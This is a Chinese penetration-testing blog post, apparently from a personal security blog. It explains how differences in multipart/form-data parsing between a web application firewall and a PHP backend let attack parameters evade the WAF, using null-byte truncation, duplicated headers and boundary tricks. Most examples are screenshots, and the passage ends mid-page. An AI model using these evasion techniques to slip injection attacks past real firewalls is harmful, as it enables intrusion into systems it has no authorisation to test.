<!DOCTYPE html>
<html lang="zh-cn">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
        <title>WAF Bypass - Geekby&#39;s Blog</title><meta name="Description" content="WAF Bypass"><meta property="og:url" content="http://localhost:1313/2022/03/waf-bypass/">
  <meta property="og:site_name" content="Geekby&#39;s Blog">
  <meta property="og:title" content="WAF Bypass">
  <meta property="og:description" content="WAF Bypass">
  <meta property="og:locale" content="zh_cn">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-03-04T15:23:00+08:00">
    <meta property="article:modified_time" content="2022-03-05T17:05:00+08:00">
    <meta property="article:tag" content="渗透测试">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="WAF Bypass">
  <meta name="twitter:description" content="WAF Bypass">
<meta name="application-name" content="Geekby&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/2022/03/waf-bypass/" /><link rel="prev" href="http://localhost:1313/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/" /><link rel="next" href="http://localhost:1313/2022/03/%E5%AF%B9%E8%B1%A1%E5%AD%98%E5%82%A8%E6%94%BB%E9%98%B2%E6%A1%88%E4%BE%8B/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "WAF Bypass",
        "inLanguage": "zh-cn",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/2022\/03\/waf-bypass\/"
        },"image": ["http:\/\/localhost:1313\/logo.png"],"genre": "posts","keywords": "渗透测试","wordcount":  826 ,
        "url": "http:\/\/localhost:1313\/2022\/03\/waf-bypass\/","datePublished": "2022-03-04T15:23:00+08:00","dateModified": "2022-03-05T17:05:00+08:00","publisher": {
            "@type": "Organization",
            "name": "Geekby","logo": {
                    "@type": "ImageObject",
                    "url": "http:\/\/localhost:1313\/images\/avatar.png",
                    "width":  358 ,
                    "height":  330 
                }},"author": {
                "@type": "Person",
                "name": "Geekby"
            },"description": "WAF Bypass"
    }
    </script></head>
    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw"></i>
                </a>
            </div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                            <i class="fas fa-search fa-fw"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                            <i class="fas fa-times-circle fa-fw"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        取消
                    </a>
                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw"></i>
            </a></div>
    </div>
</header>
<div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
</div>
<div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
</div>
<main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animated flipInX">WAF Bypass</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-03-04">2022-03-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 826 字&nbsp;
                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#bypass-思路---初级">Bypass 思路 - 初级</a>
      <ul>
        <li><a href="#0x00-截断">0x00 截断</a></li>
        <li><a href="#文件描述双写混淆">文件描述双写混淆</a></li>
        <li><a href="#multipart-混淆">multipart 混淆</a></li>
        <li><a href="#boundary-混淆">Boundary 混淆</a>
          <ul>
            <li><a href="#构造双重-boundary">构造双重 boundary</a></li>
            <li><a href="#构造双重-content-type">构造双重 Content-Type</a></li>
            <li><a href="#空白-boundary">空白 boundary</a></li>
            <li><a href="#空格-boundary">空格 boundary</a></li>
            <li><a href="#boundary-中的逗号">boundary 中的逗号</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#bypass-思路---进阶">Bypass 思路 - 进阶</a>
      <ul>
        <li><a href="#0x00-截断进阶">0x00 截断进阶</a></li>
        <li><a href="#boundary-混淆进阶">Boundary 混淆进阶</a></li>
        <li><a href="#单双引号混合">单双引号混合</a></li>
        <li><a href="#urlencoded-与-multipart-混淆">urlencoded 与 multipart 混淆</a></li>
      </ul>
    </li>
    <li><a href="#bypass-思路---高级">Bypass 思路 - 高级</a>
      <ul>
        <li><a href="#skip_upload---1">skip_upload - 1</a></li>
        <li><a href="#skip_upload---2">skip_upload - 2</a></li>
      </ul>
    </li>
    <li><a href="#关于文件扩展名的绕过">关于文件扩展名的绕过</a></li>
    <li><a href="#参考">参考</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h1 id="waf-bypass">WAF Bypass</h1>
<p>本文介绍的思路主要围绕针对于 POST 参数的 <code>multipart/form-data</code> 进行讨论。</p>
<p><code>multipart/form-data</code> 是为了解决上传文件场景下文件内容较大且内置字符不可控的问题。在最初的 http 协议中，并没有上传文件方面的功能。RFC1867 为 HTTP 协议添加了这个能力。常见的浏览器都已经支持。按照此规范将用户指定的文件发送到服务器，可以按照此规范解析出用户发送来的文件。</p>
<p>HTTP 传输的内容通过 boundary 进行了分割，以 <code>--boundary</code> 开始，并以 <code>--boundary--</code> 结尾。</p>
<p>multipart/form-data 格式也是可以传递 POST 参数的。对于 Nginx + PHP 的架构，Nginx 实际上是不负责解析 multipart/form-data 的 body 部分的，而是交由 PHP 来解析，因此 WAF 所获取的内容就很有可能与后端的 PHP 发生不一致。</p>
<p>通过一个简单的脚本来验证上面的说法。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;php://input&#34;</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;$_POST Content\n&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;$_FILES Content\n&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>正常情况下使用 multipart/form-data POST 传输一个参数 <code>f</code>，其值为 <code>1</code>：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041521288.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041521288.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041521288.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041521288.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041521288.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041521288.png-water_print" /></p>
<p>上面说到，multipart/form-data 用来解决传输文件的问题，那什么情况是上传文件？什么情况是 POST 参数呢？关键点在于有没有一个完整的 <code>filename=</code>，这 9 个字符缺一不可。加上了 <code>filename=</code> 以后的回显：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041524972.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041524972.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041524972.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041524972.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041524972.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041524972.png-water_print" /></p>
<p>由于一些 WAF 产品对用户上传文件的内容不做匹配，直接放行。因此，关键问题在于，WAF 能否准确有效识别出哪些内容是传给 POST 数组的，哪些传给 FILES 数组？如果不能，那就可以想办法让 WAF 以为我们是在上传文件，而实际上却是在 POST 一个参数，这个参数可以是命令注入、SQL 注入、SSRF 等任意的一种攻击，这样就实现了通用型的 WAF Bypass。</p>
<h2 id="bypass-思路---初级">Bypass 思路 - 初级</h2>
<h3 id="0x00-截断">0x00 截断</h3>
<p>在 filename 之前加入了 0x00 (%00 url decode)，有些 WAF 在检测前会对 HTTP 协议中的 0x00 进行过滤， 这样就导致了 WAF 认为是含有 filename 的普通上传，而后端 PHP 则认为是 POST 参数。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041534841.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041534841.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041534841.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041534841.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041534841.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041534841.png-water_print" /></p>
<h3 id="文件描述双写混淆">文件描述双写混淆</h3>
<p>双写 <code>Content-Disposition</code>，一些 WAF 会取第二行，而实际 PHP 会获取第一行。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041535090.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041535090.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041535090.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041535090.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041535090.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041535090.png-water_print" /></p>
<p>另外针对 <code>Content-Disposition</code> 的双写混淆还有可以包括 <code>Content-Type</code>:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041539002.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041539002.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041539002.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041539002.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041539002.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041539002.png-water_print" /></p>
<p>但是这种方式会将 <code>f</code> 变量中加入一些垃圾数据，在进行注入时需要进行闭合处理。</p>
<h3 id="multipart-混淆">multipart 混淆</h3>
<p>通过构建一个新的 multipart 部分，是两个部分传递的参数名相同，达到混淆的目的。</p>
<ul>
<li>带有垃圾数据的情况</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041542734.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041542734.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041542734.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041542734.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041542734.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041542734.png-water_print" /></p>
<ul>
<li>不带垃圾数据的情况</li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041542675.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041542675.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041542675.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041542675.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041542675.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041542675.png-water_print" /></p>
<h3 id="boundary-混淆">Boundary 混淆</h3>
<h4 id="构造双重-boundary">构造双重 boundary</h4>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041548446.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041548446.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041548446.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041548446.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041548446.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041548446.png-water_print" /></p>
<p>在 PHP 中，只识别到 <code>boundary=a</code>，即真正的 <code>boundary</code> 为 a。若 WAF 中识别到的 <code>boundary</code> 为 <code>b</code>，就会将第 13 行到第 18 行做为文件 <code>pic.png</code> 的内容进行传输，达到混淆的目的。</p>
<h4 id="构造双重-content-type">构造双重 Content-Type</h4>
<p>这种混淆方式与上一种情况类似，只是将 <code>Content-Type</code> 进行混淆，指定不同的 boundary。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041551351.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041551351.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041551351.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041551351.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041551351.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041551351.png-water_print" /></p>
<h4 id="空白-boundary">空白 boundary</h4>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041557946.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041557946.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041557946.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041557946.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041557946.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041557946.png-water_print" /></p>
<p>在 PHP 中，只识别到 <code>boundary=空</code>。若 WAF 中错将 <code>;</code> 识别到为 <code>boundary</code>，就会将第 13 行到第 18 行做为文件 <code>pic.png</code> 的内容进行传输，达到混淆的目的。</p>
<h4 id="空格-boundary">空格 boundary</h4>
<p>同样的 boundary 也可以是空格</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041601212.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041601212.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041601212.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041601212.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041601212.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041601212.png-water_print" /></p>
<h4 id="boundary-中的逗号">boundary 中的逗号</h4>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041608384.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041608384.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041608384.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041608384.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041608384.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041608384.png-water_print" /></p>
<p>事实上，在 PHP 中会将 Boundary 中的逗号作为分隔符，即 boundary 遇到逗号就结束。</p>
<p>只标识一个逗号也可以：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041609039.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041609039.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041609039.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041609039.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041609039.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041609039.png-water_print" /></p>
<h2 id="bypass-思路---进阶">Bypass 思路 - 进阶</h2>
<h3 id="0x00-截断进阶">0x00 截断进阶</h3>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041625935.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041625935.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041625935.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041625935.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041625935.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041625935.png-water_print" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041641335.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041641335.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041641335.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041641335.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041641335.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041641335.png-water_print" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041642723.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041642723.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041642723.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041642723.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041642723.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041642723.png-water_print" /></p>
<p>这三个位置都可以。将其替换为 0x00 和 0x20 与之同理。</p>
<p>此外，将 0x00 放到参数名中也可以绕过：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041649598.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041649598.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041649598.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041649598.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041649598.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041649598.png-water_print" /></p>
<h3 id="boundary-混淆进阶">Boundary 混淆进阶</h3>
<p>boundary 的名称是可以前后加入任意内容的，WAF 如果严格按 boundary 去取，就会出现混淆。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041654246.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041654246.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041654246.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041654246.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041654246.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041654246.png-water_print" /></p>
<p>在双写 Content-Type 的混淆中，将第一个 Content-Type 和冒号部分填入了空格，实现绕过。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041701548.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041701548.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041701548.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041701548.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041701548.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041701548.png-water_print" /></p>
<p>Boundary 的取值混淆：</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041703089.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041703089.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041703089.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041703089.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041703089.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041703089.png-water_print" /></p>
<h3 id="单双引号混合">单双引号混合</h3>
<p>Content-Disposition 中的字段使用单引号、双引号进行混淆</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041705980.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041705980.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041705980.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041705980.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041705980.png-water_print"
        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041705980.png-water_print" /></p>
<h3 id="urlencoded-与-multipart-混淆">urlencoded 与 multipart 混淆</h3>
<p>在 Content-Type 头中，分别指定为：<code>urlencoded</code> 与 <code>multipart</code>。实际上 PHP 识别到的为 <code>urlencoded</code>，若 WAF 识别到的为 multipart，就可以绕过检测。通过 &amp; 来作为参数分隔符，截取参数 <code>sqlInjectionParam</code> 的前后部分，完整保留该参数。</p>
<p>由于 <code>multipart/form-data</code> 下的内容不进行 <code>urldecoded</code>， 一些 WAF 也正是这样设计的，这样做本没有问题，但是如果是 <code>urlencoded</code> 格式的内容，不进行 url 解码就会引入 <code>%0a</code> 这样字符，而这样的字符不解码是可以直接绕过防护规则的，从而导致了绕过。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041713226.png-water_print"
        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041713226.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041713226.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041713226.png-water_print 2x"
        data-sizes="auto"
        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202203041713226.png-water_print"
